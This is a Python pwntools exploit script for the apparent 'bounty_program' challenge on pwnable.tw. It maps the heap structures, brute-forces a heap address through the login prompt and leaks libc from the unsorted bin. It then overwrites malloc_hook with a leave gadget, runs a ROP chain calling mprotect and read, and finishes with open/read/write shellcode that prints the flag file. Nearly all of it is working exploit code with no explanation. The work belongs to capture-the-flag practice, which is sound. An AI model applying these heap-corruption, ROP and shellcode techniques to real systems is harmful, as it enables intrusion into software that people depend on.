from pwn import *

context.arch = 'amd64'

###Structure
'''
user    (bounty=0,refcnt=0,pwd/name uninitialized)
    |   4   |   4   |   4   |   4   |
0x00|              pwd              |
0x10|              name             |
0x20|              name             |
0x30| bounty|       |  contact_ptr  |
0x40|  uid  |       |ref_cnt|       |
0x50|      next     |

product
    |   4   |   4   |   4   |   4   |
0x00|              name             |
0x10|              name             |
0x20|              name             |
0x30|  company_ptr  |   vuln_head   |
0x40|            comment            |
0x50|               |

type
    |   4   |   4   |   4   |   4   |
0x00|    name_ptr   | price |ref_cnt|

vuln
     |   4   |   4   |   4   |   4   |
0x000|             title             |
0x010|             title             |
0x020|             title             |
0x030|             title             |
0x040|             title             |
0x050|             title             |
0x060|             title             |
0x070|             title             |
0x080|             title             |
0x090|             title             |
0x0a0|             title             |
0x0b0|             title             |
0x0c0|             title             |
0x0d0|             title             |
0x0e0|             title             |
0x0f0|             title             |
0x100|     user_ptr  |  descrip_size |
0x110|       ID      |  descrip_ptr  |
0x120|     type_ptr  |   vuln_next   |
0x130|    vuln_prev  |   evaluated   |
'''

###Util
def login(name,pwd):
    r.sendlineafter('choice: ','1')
    r.sendafter('Username:',name)
    r.sendafter('Password:',pwd)
    if b'Login' in r.recvline():
        return True
    else:
        return False

def register(name,pwd,data):
    r.sendlineafter('choice: ','2')
    r.sendafter('Username:',name)
    r.sendafter('Password:',pwd)
    r.sendafter('Contact:',data)

def enter_bounty():
    r.sendlineafter('choice: ','1')

def unregister():
    r.sendlineafter('choice: ','5')

def logout():
    r.sendlineafter('choice: ','7')

def leave_bounty():
    r.sendlineafter('choice: ','0')

def create_product(name,company,comment):
    r.sendlineafter('choice: ','1')
    r.sendafter('Product:',name)
    r.sendafter('Company:',company)
    r.sendafter('Comment:',comment)

def create_type(size,name,price):
    r.sendlineafter('choice: ','2')
    r.sendlineafter('Size:',str(size))
    if size!=-1:
        r.sendafter('Type:',name)
    else:
        r.recvuntil('Type:')
    while b'type:' in r.recvline():
        r.sendlineafter('Price:',str(price))
        r.recvline()

def create_vuln(product_idx,type_idx,title,ID,size,data):
    r.sendlineafter('choice: ','3')
    r.sendlineafter('ID:',str(product_idx))
    r.sendlineafter('Type:',str(type_idx))
    r.sendafter('Title:',title)
    r.sendlineafter('ID:',str(ID))
    r.sendlineafter('descripton:',str(size))
    r.sendafter('Descripton:',data)

def delete_type(size,name):
    r.sendlineafter('choice: ','4')
    r.sendlineafter('Size:',str(size))
    r.sendafter('Type:',name)

def edit_vuln(product_idx,ID,title,size,data,change_type,type_idx=None,overlap=False):
    r.sendlineafter('choice: ','5')
    r.sendlineafter('ID:',str(product_idx))
    r.sendlineafter('ID:',str(ID))
    r.sendafter('Title:',title)
    r.sendlineafter('descripton:',str(size))
    if overlap is False:
        r.sendafter('Descripton:',data)
    if change_type is True:
        r.sendafter('type ? ','y')
        r.sendlineafter('Type:',str(type_idx))
    else:
        r.sendafter('type ? ','n')

def show_vuln(product_idx):
    r.sendlineafter('choice: ','6')
    r.sendlineafter('ID:',str(product_idx))
    r.recvuntil(b'\x2a\n')
    vulns = []
    while r.recv(1)!=b'$':
        vulns.append({})
        vulns[-1]['ID'] = r.recvuntil('\nTitle',drop=True).split(b' > ')[1]
        vulns[-1]['title'] = r.recvuntil('\nType',drop=True).split(b' > ')[1]
        vulns[-1]['type'] = r.recvuntil('\nReporter',drop=True).split(b' > ')[1]
        vulns[-1]['user'] = r.recvuntil('\nDescripton',drop=True).split(b' > ')[1]
        vulns[-1]['descrip'] = r.recvuntil(b'\n\xe2\x98',drop=True).split(b' > ')[1]
        r.recvline()
    return vulns

def delete_vuln(product_idx,ID):
    r.sendlineafter('choice: ','8')
    r.sendlineafter('ID:',str(product_idx))
    r.sendlineafter('ID:',str(ID))

def trigger_calloc(size):
    r.sendlineafter('choice: ','4')
    r.sendlineafter('Size:',str(size))

###Addr
#  libc2.27
main_arena_offset = 0x3ebc40
unsorted_bin_offset = main_arena_offset+0x60
malloc_hook_offset = 0x3ebc30

###ROPgadget
L_pop_rdi = 0x2155f
L_pop_rsi = 0x23e6a
L_pop_rdx = 0x1b96
L_pop_rax = 0x439c8
L_syscall = 0xd2975
L_leave = 0x54803

###Exploit
r = remote('chall.pwnable.tw',10208)

r.sendafter('Name:','M30W')
r.sendafter('Value:','M30W')

register('M30W','M30W','M30W')
login('M30W','M30W')
enter_bounty()
delete_type(0x58,'pad')
delete_type(0x58,'pad')
leave_bounty()
logout()

heap_addr = b'\x00\x00'
for i in range(5,0,-1):
    register(f'Brute\x00','a'*i,'Brute')
    for j in range(0x100):
        if login(f'Brute',b'a'*i+p8(j)+heap_addr) is True:
            heap_addr = p8(j)+heap_addr
            print(heap_addr)
            unregister()
            break
heap_addr = u64(b'\x00'+heap_addr)-0x500
if b',' in p64(heap_addr):
    print('Unlucky :(')
    exit()
print(hex(heap_addr))

login('M30W','M30W')
enter_bounty()
create_product('M30W','M30W','M30W')
print(hex(0x12c00-(heap_addr&0xf000)-0x800-0x150-0x420-0x130-0x8))
create_vuln(0,0,'pad',0,0x10000-(heap_addr&0xf000)-0x800-0x150-0x8,'pad\x00')
create_vuln(0,0,'target',1,0x2c00-0x150-0x420-0x20-0x130-0x8,'target\x00')

create_type(0x418,b'a'*0x118,0)
create_vuln(0,0,'M30W',2,0x408,'M30W\x00')
create_type(-1,None,0)

for i in range(7):
    create_type(0x148,'\x00',0)

delete_vuln(0,2)

unsorted_bin_addr = u64(show_vuln(0)[1]['title']+b'\x00\x00')
libc_base = unsorted_bin_addr-unsorted_bin_offset
if b'\x00' in p64(libc_base+L_leave)[:-2]:
    print('Unlucky :(')
    exit()
print(hex(libc_base))

create_type(0xf8,'\x00',0)
create_type(0x18,'\x00',0)
create_type(0xa8,'\x00',0)

ROPchain = p64(libc_base+L_pop_rdi)+p64(heap_addr)+\
           p64(libc_base+L_pop_rsi)+p64(0x1000)+\
           p64(libc_base+L_pop_rdx)+p64(7)+\
           p64(libc_base+L_pop_rax)+p64(10)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(0)+\
           p64(libc_base+L_pop_rsi)+p64(heap_addr)+\
           p64(libc_base+L_pop_rdx)+p64(0x1000)+\
           p64(libc_base+L_pop_rax)+p64(0)+\
           p64(libc_base+L_syscall)+\
           p64(heap_addr)
edit_vuln(0,1,p64(libc_base+malloc_hook_offset)+p64(heap_addr+0x10)+p64(0)+p64(0x21)+ROPchain,0x408,'target',False,None,True)

create_product('malloc1','malloc1','malloc1')
create_product('malloc2',p64(libc_base+L_leave),'malloc2')
trigger_calloc((heap_addr&0xffffffffffff0000)+0x10030-0x8)

shellcode = asm(f'''
                 mov rdi, {heap_addr+0x100}
                 mov rsi, 0
                 mov rdx, 0
                 mov rax, 2
                 syscall
                 mov rdi, rax
                 mov rsi, {heap_addr+0x100}
                 mov rdx, 0x100
                 mov rax, 0
                 syscall
                 mov rdi, 1
                 mov rsi, {heap_addr+0x100}
                 mov rdx, 0x100
                 mov rax, 1
                 syscall
                 ''')
payload = shellcode.ljust(0x100,b'\x00')+b'/home/bounty_program/flag'
r.send(payload)
r.interactive()
